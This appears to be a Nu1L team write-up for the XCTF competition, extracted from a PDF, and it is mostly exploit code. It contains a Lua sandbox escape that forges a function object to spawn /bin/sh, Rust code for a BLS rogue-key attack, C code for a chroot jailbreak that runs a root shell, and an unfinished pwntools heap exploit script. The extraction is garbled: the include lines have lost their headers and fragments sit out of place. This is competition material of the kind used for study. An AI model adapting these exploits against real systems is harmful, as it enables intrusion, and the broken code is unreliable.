XCTF WP
AuthorNu1L Team
wpWP
PI:EMAIL 2.0 
Nu1L
XCTF WP
lua
BLSMPS
babyjail
babybaes
hardstack
house of pig
hello arm
dngs2010
warmupcms
GSA
apk
Dubbo
space
lamaba
3*3
babydebug
easycms
spider
coturn
lua
local bit_band   = bit.band
local bit_lshift = bit.lshift
local bit_rshift = bit.rshift
local math_floor = math.floor
local math_frexp = math.frexp
local math_ldexp = math.ldexp
local math_huge  = math.huge
function UInt32sToDouble(low, high)
  local negative = false
  if high >= 0x80000000 then
    negative = true
    high = high - 0x80000000
  end
  local biasedExponent = bit_rshift(bit_band(high, 0x7FF00000), 20)
  local mantissa = (bit_band(high, 0x000FFFFF) * 4294967296 + low) / 2 ^ 52
  local f
  if biasedExponent == 0x0000 then
    f = mantissa == 0 and 0 or math_ldexp(mantissa, -1022)
  elseif biasedExponent == 0x07FF then
    f = mantissa == 0 and math_huge or(math_huge - math_huge)
  else
    f = math_ldexp(1 + mantissa, biasedExponent - 1023)
  end
  return negative and -f or f
end
function encode(value)
    code = ''
  i = 4
    while i~=0 do
        code = code .. string.char(value%256)
        value = value/256
    i = i-1
    end
    return code
end
local function a() 
  while(1)
  do
  end
  return 1
end
-- 0x40000000 44D7D0
-- 6764A0
local fake = 
"\xd0\xd7\x44\x00\xd0\xd7\x44\x00\xd0\xd7\x44\x00\xd0\xd7\x44\x00sh\x00\x00\x00\x00\x00
\x00"..encode(0x044D7E2)..encode(0x044D7E2)..encode(0x044D7E2)
local fa = tonumber( string.format( "%p", fake ), 16 )+ 32
print(encode(fa)) -- 0x451313  451309
local str = "sh\x00\x00\x00\x00\x00\x40"..encode(fa)..encode(fa-1000)..encode(fa-
1000).."\x00\x00\x00\x00"..encode(0x451309).."\x00\x00\x00\x00"..encode(0x451313).."\x0
0\x00\x00\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" 
print(a)
local address = tonumber( string.format( "%p", str ), 16 )+ 24
print( tonumber( string.format( "%p", str ), 16 ) ) 
address = UInt32sToDouble( address - 8, 0 )
local func = debug.getinfo( 0, ">f", address ).func
-- print(func)
func("/bin/sh")
BLSMPS
The rogue public-key attack.
https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html
rustbls12_381msg="admin"scalar
while(1)
do
end
use sha2::{Digest};
fn main() {
    let digest = sha2::Sha512::digest(b"admin");
    let mut tmp : [u8;64] = [0;64];
    let mut i = 0;
    for d in digest {
        tmp[i] = d;
        i = i+1
    }
    let k = bls12_381::Scalar::from_bytes_wide(&tmp);
    println!("{}", k);
}
// 0x5aad1e4aa01328f4eb1102b5f5efa77d6b6d78f6b384fa60c4765a9c18362161
babyjail
babybaes
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
int main() {
    char *shell[2] = {"/bin/sh", NULL};
    seteuid(0);
    printf("%d\n", chroot("./fuck"));
    printf("%d\n", chroot("../../../../../../"));
    execve("/bin/sh", shell, NULL);
    return 0;
}
# -*- coding: utf-8 -*-
from pwn import *
r = lambda x: p.recvuntil(x,drop=True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y: p.sendlineafter(x,y)
context.log_level = 'debug'
p = process('./bayes', env={"LD_PRELOAD":"./libc-2.31.so"})
def create(choice, value=None):
    sl('> ', str(1))
    sl('[y/n]? ', choice)
    if choice=='y':
        sl('= ', str(value))
def train(idx, features, labels):
    sl('> ', str(2))
    sl('? ', str(idx))
    sl('finish)\n', features+'\nEND')
    sl('labels: \n', labels)
def show(idx):
    sl('> ', str(3))
    sl('? ', str(idx))
def predict(idx, document):
    sl('> ', str(4))
    sl('? ', str(idx))
    sl(': \n', document)
def remove(idx):
    sl('> ', str(5))
    sl('? ', str(idx))
create('n') #0
create('n') #1
train(1, ' ', '0')
for i in range(0x50+0x70):
    train(1, ' ', '-1')
# show(0)
create('n') #1
create('n') #2
create('n') #3
create('n') #4
create('n') #5
create('n') #6
create('n') #6
create('n') #6
create('n') #6
create('n') #6
create('n') #6
create('n') #6
hardstack
remove(0)
remove(1)
train(8, ' ', '0')
train(8, ' ', '0')
train(8, ' ', '0')
remove(8)
create('n') 